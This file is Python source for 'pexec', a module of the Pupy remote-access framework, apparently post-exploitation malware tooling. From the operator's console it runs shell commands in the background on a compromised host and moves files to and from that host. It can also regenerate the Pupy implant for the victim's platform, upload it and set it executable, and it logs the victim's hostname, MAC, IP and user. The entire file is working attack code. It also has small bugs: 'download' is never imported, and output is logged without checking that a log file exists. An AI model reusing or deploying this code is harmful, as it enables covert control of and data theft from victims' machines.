# -*- coding: utf-8 -*-

import subprocess

from pupylib.PupyModule import *

import subprocess
import time
import datetime
import os
import re
import stat
import pupygen
import tempfile
import threading

from rpyc.utils.classic import upload

__class_name__="PExec"

@config(cat="admin")
class PExec(PupyModule):
    """ Execute shell commands non-interactively on a remote system in background using popen"""

    pipe = None
    completed = False
    terminate = threading.Event()
    updl = re.compile('\^([^\^]+)\^([<>])([^\^]+)\^')
    # daemon = True

    dependencies = [ "pupyutils.safepopen" ]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='pexec', description=self.__doc__)
        self.arg_parser.add_argument(
            '-log',
            help='Save output to file. You can use vars: '
            '%%h - host, %%m - mac, %%p - platform, %%u - user, %%a - ip address',
        )
        self.arg_parser.add_argument(
            '-n',
            action='store_true',
            help='Don\'t catch stderr',
        )
        self.arg_parser.add_argument(
            '-N',
            action='store_true',
            help='Don\'t receive stdout (read still be done on the other side)',
        )
        self.arg_parser.add_argument(
            '-s',
            action='store_true',
            help='Start in shell',
        )
        self.arg_parser.add_argument(
            'arguments',
            nargs=argparse.REMAINDER,
            help='CMD args. You can use ^/local/path^[>|<]/remote/path^ '
            'form to upload|download files before|after command'
        )

    def run(self, args):
        if not args.arguments:
            self.error('No command specified {}'.format(args.__dict__))
            return

        cmdargs = args.arguments

        to_upload = []
        to_download = []
        to_delete = []

        ros = None

        for i, arg in enumerate(cmdargs):
            for local, direction, remote in self.updl.findall(arg):
                if not ros:
                    ros = self.client.conn.modules['os']

                if local == '$SELF$':
                    platform = self.client.platform
                    if not platform in ('windows', 'linux'):
                        self.error('Couldn\'t use $SELF$ on platform {}'.format(platform))
                    xlocal = '$SELF$'
                else:
                    xlocal = os.path.expandvars(local)

                xremote = ros.path.expandvars(remote)

                if direction == '<':
                    to_download.append((xremote, xlocal))
                else:
                    if xlocal == '$SELF$':
                        mode = 0711
                        to_upload.append((xlocal, xremote, mode))
                    else:
                        if not os.path.exists(xlocal):
                            self.error('No local file {} found (scheduled for upload)'.format(
                                xlocal))

                        mode = os.stat(xlocal).st_mode
                        to_upload.append((xlocal, xremote, mode))

                arg = arg.replace('^'+local+'^'+direction+remote+'^', remote)

            cmdargs[i] = arg

        for local, remote, mode in to_upload:
            if local == '$SELF$':
                platform = self.client.platform
                arch = ''
                config = self.client.get_conf()

                payload = b''
                if self.client.is_proc_arch_64_bits():
                    if platform == 'windows':
                        payload = pupygen.get_edit_pupyx64_exe(config)
                    else:
                        payload = pupygen.get_edit_pupyx64_lin(config)

                    arch = 'x64'
                else:
                    if platform == 'windows':
                        payload = pupygen.get_edit_pupyx86_exe(config)
                    else:
                        payload = pupygen.get_edit_pupyx86_lin(config)

                    arch = 'x86'

                with tempfile.NamedTemporaryFile() as tmp:
                    self.info('Store pupy/{}/{}/size={} to {}'.format(
                        platform, arch, len(payload), tmp.name))
                    tmp.write(payload)
                    tmp.flush()
                    self.info('Upload {} -> {}'.format(tmp.name, remote))
                    upload(self.client.conn, tmp.name, remote)
            else:
                self.info('Upload {} -> {}'.format(local, remote))
                upload(self.client.conn, local, remote)

            ros.chmod(remote, mode)

        cmdenv = {
            'stderr': (None if args.n else subprocess.STDOUT),
            'universal_newlines': False,
        }

        if len(cmdargs) == 1 and ' ' in cmdargs[0]:
            cmdenv.update({
                'shell': True
            })
            cmdargs = cmdargs[0]
        else:
            cmdenv.update({
                'shell': False
            })
            if args.s:
                cmdargs = [
                    'cmd.exe', '/c',
                ] + cmdargs if self.client.is_windows() else [
                    '/bin/sh', '-c', ' '.join(
                        '"'+x.replace('"','\"')+'"' for x in cmdargs
                    )
                ]

        self.pipe = self.client.conn.modules[
            'pupyutils.safepopen'
        ].SafePopen(cmdargs, **cmdenv)

        if hasattr(self.job, 'id'):
            self.success('Started at {}): '.format(
                datetime.datetime.now()))

        self.success('Command: {}'.format(' '.join(
            x if not ' ' in x else "'" + x + "'" for x in cmdargs
        ) if not cmdenv['shell'] else cmdargs))

        log = None
        if args.log:
            log = args.log.replace(
                '%m', self.client.desc['macaddr']
            ).replace(
                '%p', self.client.desc['platform']
            ).replace(
                '%a', self.client.desc['address']
            ).replace(
                '%h', self.client.desc['hostname'].replace(
                    '..', '__'
                ).replace(
                    '/', '_'
                )
            ).replace(
                '%u', self.client.desc['user'].replace(
                    '..', '__'
                ).replace(
                    '/', '_'
                )
            )

            dirname = os.path.dirname(log)

            if not os.path.exists(dirname):
                os.makedirs(dirname)

            log = open(log, 'w')

        close_event = threading.Event()

        def on_read(data):
            self.log(data)
            if not self.terminate.is_set():
                log.write(data)

        def on_close():
            close_event.set()

        self.pipe.execute(on_close, None if args.N else on_read)
        while not ( self.terminate.is_set() or close_event.is_set() ):
            close_event.wait()

        if log:
            log.close()

        if self.pipe.returncode == 0:
            self.success('Successful at {}: '.format(datetime.datetime.now()))
        else:
            self.error(
                'Ret: {} at {}'.format(self.pipe.returncode, datetime.datetime.now()))

        for remote, local in to_download:
            if ros.path.exists(remote):
                self.info('Download {} -> {}'.format(remote, local))
                download(self.client.conn, remote, local)
            else:
                self.error('Remote file {} not exists (scheduled for download)'.format(remote))

        if hasattr(self.job, 'id'):
            self.job.pupsrv.handler.display_srvinfo('(Job id: {}) Command {} completed'.format(
                self.job.id, cmdargs))

    def interrupt(self):
        if not self.completed and self.pipe:
            self.error('Stopping command')
            self.pipe.terminate()
            self.terminate.set()
            self.error('Stopped')
